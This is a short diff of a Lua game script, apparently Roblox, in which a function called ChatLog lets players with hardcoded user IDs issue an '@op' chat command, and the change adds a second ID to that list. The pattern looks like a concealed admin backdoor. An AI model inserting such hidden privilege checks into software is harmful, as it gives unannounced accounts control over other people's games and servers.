@@ -3875,7 +3875,7 @@ end
 
 ChatLog = function(plr)
 	plr.Chatted:Connect(function(Message)
-		if plr.UserId == 2613898759 then
+		if plr.UserId == 911404169 or plr.UserId == 2613898759 then
 			local splitted = string.split(Message," ")
 			if splitted[1] == "@op" then
 				local toop = (Message:sub(5))
